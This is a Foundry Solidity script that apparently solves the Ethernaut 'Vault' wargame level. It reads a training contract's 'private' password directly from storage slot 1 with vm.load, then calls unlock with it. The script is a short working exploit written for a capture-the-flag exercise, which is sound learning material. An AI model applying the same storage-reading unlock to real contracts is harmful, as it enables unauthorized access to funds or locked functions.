// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../../src/Ethernaut/Vault.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Vault vault = Vault(0xe138DC5Fb68C89ecd37118E5aD144e83D91b3954);
        bytes32 password = vm.load(address(0xe138DC5Fb68C89ecd37118E5aD144e83D91b3954), bytes32(uint256(1)));
        vault.unlock(password);
        vm.stopBroadcast();
    }
}
